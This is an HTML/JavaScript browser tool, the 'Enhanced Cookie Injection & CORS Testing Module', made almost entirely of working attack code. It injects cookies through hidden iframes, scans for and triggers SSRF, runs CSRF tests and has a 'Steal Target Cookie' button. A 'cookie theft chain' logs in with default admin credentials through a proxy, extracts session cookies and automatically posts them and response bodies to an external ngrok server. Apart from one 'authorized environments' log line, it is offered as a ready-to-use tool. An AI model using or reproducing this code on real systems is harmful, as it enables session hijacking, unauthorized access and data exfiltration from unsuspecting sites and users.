<!doctype html>
<meta charset="utf-8" />
<title>Enhanced Cookie Injection & CORS Testing Module</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 1rem; background: #0a0e1a; color: #d6ffe6; }
  .section { background: #131823; padding: 16px; margin: 12px 0; border-radius: 8px; border: 1px solid #1e2837; }
  .section h3 { margin-top: 0; color: #6ee7b7; }
  input, button, select, textarea { font-size: 14px; margin: 4px; padding: 8px 12px; background: #1e2837; color: #d6ffe6; border: 1px solid #2d3748; border-radius: 4px; }
  button { cursor: pointer; background: #1e3a5f; transition: all 0.2s; }
  button:hover:not(:disabled) { background: #2563eb; }
  button:disabled { opacity: 0.5; cursor: not-allowed; }
  #out { white-space: pre-wrap; background: #0b1020; color: #d6ffe6; padding: 12px; border-radius: 6px; min-height: 300px; margin-top: 10px; font-family: 'Courier New', monospace; font-size: 13px; max-height: 600px; overflow-y: auto; }
  .row { margin: 8px 0; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
  label { color: #a5b4fc; }
  .success { color: #6ee7b7; }
  .error { color: #fca5a5; }
  .warning { color: #fcd34d; }
  .status-badge { padding: 2px 6px; border-radius: 4px; font-weight: bold; }
  .status-success { background:#1a7f37; }
  .status-error   { background:#b00020; }
  .status-warning { background:#b45309; }
  .status-info    { background:#1e40af; }
</style>

<h1>Enhanced Cookie Injection & CORS Testing Module</h1>

<div class="row">
  <button id="cookieTheftChain">Run Cookie Theft Chain</button>
  <span id="chainStatus" style="margin-left:12px;"></span>
</div>

<!-- Target Config -->
<div class="section">
<h3>Target Configuration</h3>
<div class="row"><label>Target Origin:</label><input id="target" value="https://portal.playground.example.com" size="50"></div>
<div class="row"><label>Target Path:</label><input id="path" value="/api/protected" size="40"></div>
<div class="row"><label>Cookie Name to Inject:</label><input id="cookieName" value="session" size="30"></div>
<div class="row"><label>Cookie Value:</label><input id="cookieValue" value="INJECTED_VALUE" size="40"></div>
</div>

<!-- Server Config -->
<div class="section">
<h3>Server Configuration (ngrok)</h3>
<div class="row"><label>Your ngrok/Server URL:</label><input id="serverUrl" value="http://localhost:3000" size="50"></div>
<div class="row"><label>Evidence endpoint (relative):</label><input id="evidenceEndpoint" value="/collect-evidence" size="30"></div>
<div class="row"><button id="testServer">Test Server Connection</button></div>
<div class="row"><label><input type="checkbox" id="autoExfil" checked /> Auto-send results to server</label></div>
</div>

<!-- SSRF Canary -->
<div class="section">
<h3>Next.js SSRF Canary</h3>
<div class="row">
  <label>Canary URL:</label>
  <input id="canaryUrl" size="60" readonly placeholder="Click Generate">
  <button id="genCanary">Generate</button>
</div>
<div class="row">
  <label>Payload URL (inject into fetch):</label>
  <input id="ssrfPayload" size="70" placeholder="Paste canary URL here">
</div>
<div class="row">
  <button id="triggerSSRF">Trigger SSRF</button>
  <span id="ssrfTriggerStatus" style="margin-left:12px;"></span>
</div>
<div class="row">
  <button id="scanSSRF">Scan for SSRF Endpoints</button>
  <span id="ssrfStatus" style="margin-left:12px;"></span>
</div>
</div>

<!-- Attack Methods -->
<div class="section">
<h3>Attack Methods</h3>
<div class="row">
<button id="basicInjection">Basic Cookie Injection</button>
<button id="advancedInjection">Multi-Vector Injection</button>
<button id="timingAttack">Timing Analysis</button>
</div>
<div class="row">
<button id="csrfTest">CSRF Test</button>
<button id="batchTest">Batch Scanner</button>
<button id="proxyFetch">Use Server Proxy (Bypass CORS)</button>
<button id="directCorsTest">Direct CORS Test (credentials)</button>
<button id="automatedExfil">Full Attack Chain</button>
<button id="stealCookie">Steal Target Cookie</button>
<button id="showInjected">Show Injected Cookie</button>
</div>
</div>

<!-- Advanced Options -->
<div class="section">
<h3>Advanced Options</h3>
<div class="row">
<label>HTTP Method:</label>
<select id="method">
<option>GET</option><option selected>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option>
</select>
</div>
<div class="row">
<label>Request Body (JSON):</label>
<textarea id="body" rows="2" cols="60">{"action": "test", "timestamp": "${Date.now()}"}</textarea>
</div>
<div class="row">
<label><input type="checkbox" id="cleanupCookies" checked /> Cleanup cookies after test</label>
</div>
</div>

<!-- Manual Cookie -->
<div class="section">
<h3>Manual Cookie Management</h3>
<div class="row">
<label>Cookie Name:</label><input id="manualCookieName" value="test_cookie" size="20">
<label>Value:</label><input id="manualCookieValue" value="test_value" size="30">
<button id="setCookieBtn">Set Cookie</button>
<button id="showCookiesBtn">Show All Cookies</button>
</div>
</div>

<!-- Investigator Notes -->
<div class="section">
<h3>Investigator Notes</h3>
<div class="row"><textarea id="notes" rows="4" style="width: 100%; font-family: inherit;" placeholder="Write your observations, findings, timestamps here..."></textarea></div>
<div class="row">
<button id="sendNotes">Send Notes to Server</button>
<button id="clearNotes">Clear Notes</button>
<span id="notesStatus" style="margin-left: 12px;"></span>
</div>
</div>

<!-- Output & Evidence -->
<div class="section">
<h3>Output & Evidence</h3>
<div class="row">
<button id="clearLog">Clear Log</button>
<button id="downloadEvidence">Download Evidence</button>
<button id="copyResults">Copy to Clipboard</button>
<span id="status" style="margin-left: 12px;"></span>
</div>
<div id="out"></div>
</div>

<script>
// ---------------------------------------------------------------------------
// Utility
// ---------------------------------------------------------------------------
function getServerUrl() { return document.getElementById('serverUrl').value.trim(); }

function setStatus(msg, type = 'info') {
  const el = document.getElementById('status');
  el.innerHTML = `<span class="status-badge status-${type}">${msg}</span>`;
  setTimeout(() => el.innerHTML = '', 5000);
}
function setNotesStatus(msg, err = false) {
  const el = document.getElementById('notesStatus');
  el.textContent = msg;
  el.style.color = err ? '#b00020' : '#1a7f37';
}
function log(msg, level = 'info') {
  const ts = new Date().toISOString();
  const prefix = { success:'OK', error:'ERROR', warning:'WARNING', info:'INFO' }[level] || '•';
  const line = `[${ts}] ${prefix} ${msg}`;
  const out = document.getElementById('out');
  const span = document.createElement('span');
  span.className = level;
  span.textContent = line + '\n';
  out.appendChild(span);
  out.scrollTop = out.scrollHeight;
  logBuffer.push(line);
}
function hr() { log('─'.repeat(80)); }
function clear() { document.getElementById('out').textContent=''; logBuffer=[]; testResults=[]; }

let logBuffer = [];
let testResults = [];

// ---------------------------------------------------------------------------
// Config helper
// ---------------------------------------------------------------------------
function getConfig(override = {}) {
  const bodyRaw = document.getElementById('body').value;
  const body = bodyRaw.includes('${Date.now()}') ? bodyRaw.replace('${Date.now()}', Date.now()) : bodyRaw;
  return {
    target: document.getElementById('target').value.trim(),
    path:   document.getElementById('path').value.trim(),
    cookieName: document.getElementById('cookieName').value.trim(),
    cookieValue: document.getElementById('cookieValue').value.trim(),
    method: document.getElementById('method').value,
    body,
    cleanup: document.getElementById('cleanupCookies').checked,
    ...override
  };
}

function parseSetCookie(raw) {
  if (!raw) return null;
  const parts = raw.split(';').map(s => s.trim()).filter(Boolean);
  if (!parts.length) return null;

  let nameValue = parts.shift();
  const eqIndex = nameValue.indexOf('=');
  if (eqIndex === -1) return null;

  const name = nameValue.slice(0, eqIndex);
  let value = nameValue.slice(eqIndex + 1);
  if (value.startsWith('"') && value.endsWith('"')) {
    value = value.slice(1, -1);
  }

  const cookie = {
    name,
    value: decodeURIComponent(value),
    httpOnly: false,
    secure: false,
    path: '/',
    domain: null,
    sameSite: 'Lax'
  };

  for (const part of parts) {
    const eq = part.indexOf('=');
    const k = (eq === -1 ? part : part.slice(0, eq)).toLowerCase();
    const v = eq === -1 ? null : part.slice(eq + 1);
    if (k === 'httponly') cookie.httpOnly = true;
    else if (k === 'secure') cookie.secure = true;
    else if (k === 'path') cookie.path = v;
    else if (k === 'domain') cookie.domain = v;
    else if (k === 'samesite' && ['strict','lax','none'].includes(v.toLowerCase())) cookie.sameSite = v.toLowerCase();
  }

  return cookie;
}
// ---------------------------------------------------------------------------
// CANARY GENERATOR
// ---------------------------------------------------------------------------
document.getElementById('genCanary').onclick = () => {
  const id = crypto.randomUUID();
  const url = `${getServerUrl()}/canary/${id}`;
  document.getElementById('canaryUrl').value = url;
  document.getElementById('ssrfPayload').value = url;
  log(`Canary generated: ${url}`, 'success');
};

// ---------------------------------------------------------------------------
// SSRF ENDPOINT SCANNER
// ---------------------------------------------------------------------------
document.getElementById('scanSSRF').onclick = async () => {
  const base = document.getElementById('target').value.trim();
  if (!base) return log('Set target origin first', 'error');

  const statusEl = document.getElementById('ssrfStatus');
  statusEl.textContent = 'Scanning...';
  statusEl.style.color = '#fcd34d';

  const candidates = [
    '/api/proxy','/api/fetch','/api/preview','/api/image',
    '/api/metadata','/api/og','/api/webhook/test','/api/ssrf'
  ];
  let found = 0;

  for (const p of candidates) {
    const url = base + p;
    try {
      await fetch(url, { method: 'OPTIONS', mode: 'no-cors' });
      log(`SSRF candidate: ${url}`, 'warning');
      found++;
    } catch (_) {}
    await new Promise(r => setTimeout(r, 120));
  }

  statusEl.textContent = found ? `${found} candidates` : 'None found';
  statusEl.style.color = found ? '#fca5a5' : '#6ee7b7';
};

// ---------------------------------------------------------------------------
// TRIGGER SSRF
// ---------------------------------------------------------------------------
document.getElementById('triggerSSRF').onclick = async () => {
  const payload = document.getElementById('ssrfPayload').value.trim();
  if (!payload) return log('Enter canary URL', 'error');

  const base = document.getElementById('target').value.trim();
  const path = document.getElementById('path').value.trim() || '/api/ssrf';
  const url = base + path;

  log(`Triggering SSRF → ${url}`, 'warning');
  const statusEl = document.getElementById('ssrfTriggerStatus');
  statusEl.textContent = 'Sending...';
  statusEl.style.color = '#fcd34d';

  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: payload }),
      credentials: 'include'
    });
    const txt = await r.text();
    log(`Response: ${r.status} ${txt.slice(0,200)}`, r.ok ? 'success' : 'warning');
    statusEl.textContent = 'Sent – check server logs';
    statusEl.style.color = '#6ee7b7';
  } catch (e) {
    log(`Request failed: ${e.message}`, 'error');
    statusEl.textContent = 'Failed';
    statusEl.style.color = '#fca5a5';
  }
};

// ---------------------------------------------------------------------------
// SERVER HEALTH
// ---------------------------------------------------------------------------
document.getElementById('testServer').onclick = async () => {
  const url = getServerUrl() + '/health';
  try {
    const r = await fetch(url);
    if (r.ok) {
      const d = await r.json();
      log('Server OK', 'success');
      log(JSON.stringify(d), 'info');
      setStatus('Connected', 'success');
    } else {
      log(`Server ${r.status}`, 'warning');
      setStatus('Issue', 'warning');
    }
  } catch (e) {
    log(`Connect error: ${e.message}`, 'error');
    setStatus('Failed', 'error');
  }
};

// ---------------------------------------------------------------------------
// EXFILTRATION
// ---------------------------------------------------------------------------
async function exfiltrateToServer(data) {
  const endpoint = getServerUrl() + document.getElementById('evidenceEndpoint').value;
  log(`Sending evidence → ${endpoint}`, 'info');
  try {
    const r = await fetch(endpoint, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        type: 'cookie_injection_evidence',
        timestamp: new Date().toISOString(),
        data,
        metadata: {userAgent: navigator.userAgent, origin: location.origin, testCount: testResults.length}
      })
    });
    if (r.ok) {
      const j = await r.json();
      log(`Saved (ID: ${j.evidence_id||'—'})`, 'success');
      return true;
    } else {
      const txt = await r.text();
      log(`Server ${r.status}: ${txt}`, 'error');
      return false;
    }
  } catch (e) {
    log(`Exfil error: ${e.message}`, 'error');
    return false;
  }
}

// ---------------------------------------------------------------------------
// COOKIE INJECTION ENGINE
// ---------------------------------------------------------------------------
async function cookieInjectionAttack(cfg) {
  const {target, path='/', cookieName, cookieValue, method='POST', body=null, timeout=5000, cleanup=true, vectors=['standard']} = cfg;
  const url = new URL(path, target);
  const domain = url.hostname;
  const targetPath = url.pathname;

  log(`Inject → ${url.href}`, 'info');
  const result = {target:url.href, timestamp:new Date().toISOString(), cookieName, success:false, vectors:[], response:null, timing:{}, error:null};

  return new Promise(resolve => {
    const iframe = document.createElement('iframe');
    iframe.src = url.href;
    iframe.style.display='none';
    iframe.sandbox = 'allow-same-origin allow-scripts';
    document.body.appendChild(iframe);

    const tid = setTimeout(() => { cleanupIframe(); result.error='Timeout'; log('Timeout', 'warning'); resolve(result); }, timeout);

    const cleanupIframe = () => {
      clearTimeout(tid);
      if (iframe.parentNode) iframe.remove();
      if (cleanup) {
        ['','='].forEach(sep=>{ try{ document.cookie = `${cookieName}${sep}; domain=${domain}; path=${targetPath}; expires=Thu, 01 Jan 1970 00:00:00 GMT`; }catch(_){} });
      }
    };

    iframe.onload = async () => {
      const start = performance.now();
      try {
        const inj = {
          standard: `${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
          quoted: `${cookieName}="${cookieValue}"; domain=${domain}; path=${targetPath}`,
          version: `$Version=1; ${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
          dummy: `dummy=qaz"; domain=${domain}; path=/`
        };
        vectors.forEach(v => {
          if (inj[v]) {
            try { document.cookie = inj[v]; result.vectors.push({name:v, cookie:inj[v], success:true}); log(`Injected ${v}`, 'success'); }
            catch (e) { result.vectors.push({name:v, success:false, error:e.message}); log(`Failed ${v}`, 'error'); }
          }
        });
        await new Promise(r=>setTimeout(r,100));
        result.timing.injection = performance.now()-start;

        const opts = {method, credentials:'include', mode:'cors', headers:{'Content-Type':'application/json'}};
        if (body && method!=='GET') opts.body = typeof body==='string'?body:JSON.stringify(body);
        const resp = await fetch(url.href, opts);
        result.timing.request = performance.now() - (performance.now() - result.timing.injection) - start;
        result.timing.total = performance.now() - start;

        result.response = {status:resp.status, statusText:resp.statusText, headers:{}, corsHeaders:{}};
        resp.headers.forEach((v,k)=>{ result.response.headers[k]=v; if(k.toLowerCase().includes('access-control')) result.response.corsHeaders[k]=v; });
        try {
          const ct = resp.headers.get('content-type')||'';
          result.response.body = ct.includes('json') ? await resp.json() : await resp.text();
        } catch(e){ result.response.bodyError = e.message; }

        result.success = true;
        log(`Request ${resp.status}`, 'success');
      } catch (err) {
        result.error = err.message;
        if (err.message.includes('CORS')) log('CORS blocked (expected)', 'warning');
        else log(`Error: ${err.message}`, 'error');
      } finally { cleanupIframe(); testResults.push(result); resolve(result); }
    };

    iframe.onerror = () => { cleanupIframe(); result.error='iframe load fail'; log('iframe error', 'error'); resolve(result); };
  });
}

// ---------------------------------------------------------------------------
// STUBS
// ---------------------------------------------------------------------------
async function timingAttackAnalysis() { log('Timing stub – not implemented', 'info'); return {}; }
async function batchEndpointScan() { log('Batch stub – not implemented', 'info'); return []; }

// ---------------------------------------------------------------------------
// STEAL COOKIE
// ---------------------------------------------------------------------------
document.getElementById('showInjected').onclick = () => {
  const name = document.getElementById('cookieName').value.trim();
  const cookies = document.cookie.split(';').map(c => c.trim());
  const match = cookies.find(c => c.startsWith(`${name}=`));
  log(`Injected cookie: ${match || '(not found)'}`);
  if (match) {
    const [k, v] = match.split('=');
    log(`→ Name: ${k}, Value: ${decodeURIComponent(v)}`, 'success');
  }
};

document.getElementById('stealCookie').onclick = async () => {
  const target = document.getElementById('target').value.trim();
  const cookieName = document.getElementById('cookieName').value.trim();
  try {
    await fetch(`${target}/`, { credentials: 'include', mode: 'cors' });
    const stolen = document.cookie.split(';').find(c => c.trim().startsWith(`${cookieName}=`));
    log(`Cookie found: ${stolen || '(none)'}`, stolen ? 'success' : 'warning');
    if (stolen) await exfiltrateToServer({ type: 'cookie_theft', cookie: stolen });
  } catch (e) {
    log('CORS blocked (expected)', 'warning');
  }
};

// ---------------------------------------------------------------------------
// ATTACK BUTTONS
// ---------------------------------------------------------------------------
document.getElementById('basicInjection').onclick = async () => {
  clear(); const c = getConfig(); setStatus('Basic…','info');
  const r = await cookieInjectionAttack(c);
  setStatus(r.success?'OK':'Failed', r.success?'success':'error');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('advancedInjection').onclick = async () => {
  clear(); const c = getConfig({vectors:['standard','quoted','version','dummy']});
  setStatus('Multi-vector…','info');
  const r = await cookieInjectionAttack(c);
  setStatus(r.success?'OK':'Failed', r.success?'error':'error');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('timingAttack').onclick = async () => {
  clear(); const c = getConfig({method:'GET'});
  setStatus('Timing…','info');
  const r = await timingAttackAnalysis(c);
  setStatus('Done','success');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('batchTest').onclick = async () => {
  clear(); const base = document.getElementById('target').value.trim();
  const cn = document.getElementById('cookieName').value.trim();
  const cv = document.getElementById('cookieValue').value.trim();
  setStatus('Scanning…','info');
  const r = await batchEndpointScan(base,cn,cv);
  const vul = r.filter(x=>x.vulnerable).length;
  setStatus(`${vul} vulnerable`, vul?'warning':'success');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('csrfTest').onclick = async () => {
  clear(); log('CSRF test…','warning');
  const c = getConfig({method:document.getElementById('method').value,
    body:JSON.stringify({action:'csrf_test',ts:Date.now(),id:crypto.randomUUID?.()||Math.random().toString(36).substr(2,9)})});
  setStatus('CSRF…','warning');
  const r = await cookieInjectionAttack(c);
  if (r.success && r.response?.status<300) { log('CSRF succeeded!','error'); setStatus('CSRF possible','error'); }
  else { log('CSRF blocked','info'); setStatus('CSRF blocked','success'); }
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('automatedExfil').onclick = async () => {
  clear(); const c = getConfig({method:'GET'});
  setStatus('Full chain…','warning');
  const r = await cookieInjectionAttack(c);
  const ok = await exfiltrateToServer(r);
  setStatus(ok?'Exfiltrated':'Failed', ok?'success':'error');
};

document.getElementById('proxyFetch').onclick = async () => {
  clear(); 
  const srv = getServerUrl();
  const tgt = document.getElementById('target').value.trim() + document.getElementById('path').value.trim();
  
  // INJECT COOKIE FOR YOUR NGROK DOMAIN
  const ngrokDomain = new URL(srv).hostname;
  const cookieName = document.getElementById('cookieName').value.trim();
  const cookieValue = document.getElementById('cookieValue').value.trim();
  document.cookie = `${cookieName}=${cookieValue}; domain=${ngrokDomain}; path=/; Secure; SameSite=None`;

  const payload = {
    targetUrl: tgt,
    method: document.getElementById('method').value,
    // Optional: forward body
    body: document.getElementById('body').value
  };

  log(`Proxy → ${tgt} (with cookie ${cookieName}=${cookieValue})`, 'info');

  try {
    const res = await fetch(srv+'/proxy-fetch', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
    const d = await res.json();
    if (d.ok) { log('Proxy OK','success'); log(JSON.stringify(d.data,null,2).slice(0,1500)); if (document.getElementById('autoExfil').checked) await exfiltrateToServer(d.data); }
    else log(`Proxy error: ${d.error}`,'error');
  } catch(e){ log(`Proxy fail: ${e.message}`,'error'); }
};

document.getElementById('directCorsTest').onclick = async () => {
  clear();
  const url = document.getElementById('target').value.trim() +
              document.getElementById('path').value.trim();

  log(`Direct fetch → ${url}`, 'info');

  try {
    const r = await fetch(url, {
      method: 'GET',
      credentials: 'include',
      mode: 'cors'
    });

    const txt = await r.text();
    log(`Status ${r.status}`, r.ok ? 'success' : 'warning');
    log(txt.slice(0,800));

    // ---- SAFE: Extract Set-Cookie
    const rawCookie = r.headers.get('set-cookie');
    const setCookieHeaders = rawCookie ? [rawCookie] : [];

    if (setCookieHeaders.length) {
      log(`Found ${setCookieHeaders.length} Set-Cookie header(s)`, 'warning');
      setCookieHeaders.forEach(raw => {
        try {
          const parsed = parseSetCookie(raw);
          if (!parsed) return;

          if (parsed.httpOnly) {
            log(`HttpOnly cookie stored by browser: ${parsed.name}`, 'info');
            return;
          }

          const ngrokDomain = new URL(getServerUrl()).hostname;
          const clientCookie = `${parsed.name}=${encodeURIComponent(parsed.value)};` +
                              `path=${parsed.path || '/'};domain=${ngrokDomain};Secure;SameSite=None`;
          document.cookie = clientCookie;
          log(`Stored non-HttpOnly cookie → ${parsed.name}=${parsed.value.slice(0,30)}…`, 'success');
        } catch (e) {
          log(`Parse error: ${raw.slice(0,60)}…`, 'error');
        }
      });
    }

    if (document.getElementById('autoExfil').checked)
      await exfiltrateToServer({url, status: r.status, body: txt});

  } catch (e) {
    log(`CORS blocked: ${e.message}`, 'warning');
  }
};

document.getElementById('clearLog').onclick = clear;

document.getElementById('downloadEvidence').onclick = () => {
  const payload = {timestamp:new Date().toISOString(), logs:logBuffer, results:testResults,
    metadata:{userAgent:navigator.userAgent, origin:location.origin}};
  const blob = new Blob([JSON.stringify(payload,null,2)],{type:'application/json'});
  const a = document.createElement('a'); a.href=URL.createObjectURL(blob);
  a.download=`evidence-${Date.now()}.json`; a.click(); URL.revokeObjectURL(a.href);
  setStatus('Downloaded','success');
};

document.getElementById('copyResults').onclick = () => {
  navigator.clipboard.writeText(logBuffer.join('\n')).then(()=>setStatus('Copied','success')).catch(()=>setStatus('Failed','error'));
};

// ---------------------------------------------------------------------------
// MANUAL COOKIE & NOTES
// ---------------------------------------------------------------------------
document.getElementById('setCookieBtn').onclick = () => {
  const n = document.getElementById('manualCookieName').value.trim();
  const v = document.getElementById('manualCookieValue').value.trim();  
  document.cookie = `${n}=${encodeURIComponent(v)}; path=/`;
  log(`Set ${n}=${v}`,'info');
};

document.getElementById('showCookiesBtn').onclick = () => {
  const cookies = document.cookie || '(none)';
  log('Current cookies:','info');
  log(cookies,'info');
};

document.getElementById('sendNotes').onclick = async () => {
  const txt = document.getElementById('notes').value.trim();
  if (!txt) { setNotesStatus('Empty',true); return; }
  const payload = {
    notes: txt.slice(0,20000),
    target: document.getElementById('target').value || location.href,
    timestamp: new Date().toISOString(),
    user_agent: navigator.userAgent,
    url: location.href
  };
  const btn = document.getElementById('sendNotes');
  btn.disabled = true; btn.textContent = 'Sending…';
  try {
    const r = await fetch(getServerUrl() + '/notes', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    });
    if (!r.ok) throw new Error(`${r.status}`);
    setNotesStatus('Sent OK ' + new Date().toISOString());
  } catch (e) {
    setNotesStatus('Failed – saved locally',true);
    try { localStorage.setItem('notes_'+Date.now(), JSON.stringify(payload)); } catch (_) {}
  } finally {
    btn.disabled = false; btn.textContent = 'Send Notes to Server';
  }
};

document.getElementById('clearNotes').onclick = () => {
  if (confirm('Clear notes?')) { document.getElementById('notes').value=''; setNotesStatus('Cleared'); }
};

// ================================================================
// COOKIE THEFT CHAIN ENGINE
// ================================================================
let chainInProgress = false;

document.getElementById('cookieTheftChain').onclick = async () => {
  if (chainInProgress) return;
  chainInProgress = true;
  clear();
  const statusEl = document.getElementById('chainStatus');
  statusEl.textContent = 'Starting...';
  statusEl.style.color = '#fcd34d';

  const chain = [
    // Step 1: Login (POST credentials)
    {
      name: 'Login',
      method: 'POST',
      path: '/api/login',
      body: { username: 'admin', password: 'admin123' },
      expectCookies: true
    },
    // Step 2: Dashboard (GET)
    {
      name: 'Dashboard',
      method: 'GET',
      path: '/dashboard',
      expectCookies: false
    },
    // Step 3: Tickets (GET)
    {
      name: 'Dashboard',
      method: 'GET',
      path: '/account/tickets',
      expectCookies: false
    },
    // Step 4: API Call (GET with auth)
    {
      name: 'API Data',
      method: 'GET',
      path: '/api/protected',
      expectCookies: false
    }
  ];

  const base = document.getElementById('target').value.trim();
  const srv = getServerUrl();
  const ngrokDomain = new URL(srv).hostname;
  const results = [];

  let step = 0;
  for (const task of chain) {
    step++;
    log(`--- Chain Step ${step}: ${task.name} ---`, 'info');
    statusEl.textContent = `Step ${step}/${chain.length}: ${task.name}`;

    const url = base + task.path;
    const payload = {
      targetUrl: url,
      method: task.method,
      body: task.body ? JSON.stringify(task.body) : undefined
    };

    try {
      const res = await fetch(`${srv}/proxy-fetch`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        credentials: 'include'
      });

      const d = await res.json();
      if (!d.ok) throw new Error(d.error || 'proxy failed');

      log(`${task.name} → ${d.data.status}`, d.data.status < 400 ? 'success' : 'warning');
      log(d.data.content.slice(0, 800));

      // === EXTRACT & STORE COOKIES ===
      const headers = d.data.headers || {};
      const setCookies = []
        .concat(headers['set-cookie'] || [])
        .concat(headers['Set-Cookie'] || [])
        .filter(Boolean);

      const stolen = [];
      if (setCookies.length) {
        log(`Found ${setCookies.length} Set-Cookie(s)`, 'warning');
        setCookies.forEach(raw => {
          const parsed = parseSetCookie(raw);
          if (!parsed) return;

          if (parsed.httpOnly) {
            log(`HttpOnly: ${parsed.name} (stored by browser)`, 'info');
            return;
          }

          const clientCookie = `${parsed.name}=${encodeURIComponent(parsed.value)};` +
                              `path=${parsed.path || '/'};domain=${ngrokDomain};Secure;SameSite=None`;
          document.cookie = clientCookie;
          stolen.push({ name: parsed.name, value: parsed.value });
          log(`STOLEN → ${parsed.name}=${parsed.value.slice(0,40)}…`, 'success');
        });
      } else if (task.expectCookies) {
        log(`No cookies set (expected)`, 'warning');
      }

      results.push({
        step: task.name,
        url,
        status: d.data.status,
        stolenCookies: stolen,
        body: d.data.content.slice(0, 2000)
      });

      // Auto-exfiltrate each step
      if (document.getElementById('autoExfil').checked) {
        await exfiltrateToServer({
          chain_step: task.name,
          url,
          status: d.data.status,
          stolen_cookies: stolen,
          response_preview: d.data.content.slice(0, 1000)
        });
      }

    } catch (e) {
      log(`Step failed: ${e.message}`, 'error');
      results.push({ step: task.name, error: e.message });
      break;
    }

    await new Promise(r => setTimeout(r, 800)); // rate limit
  }

  // === FINAL REPORT ===
  hr();
  log(`CHAIN COMPLETE: ${results.filter(r => !r.error).length}/${chain.length} steps`, 'success');
  statusEl.textContent = 'Done';
  statusEl.style.color = '#6ee7b7';

  // Final exfil
  if (document.getElementById('autoExfil').checked) {
    await exfiltrateToServer({
      type: 'cookie_theft_chain_complete',
      summary: results,
      total_stolen: results.flatMap(r => r.stolenCookies || []).length
    });
  }

  chainInProgress = false;
};

// ---------------------------------------------------------------------------
// INIT
// ---------------------------------------------------------------------------
log('Module loaded','success');
log('Use only in authorized environments','warning');
hr();
</script>
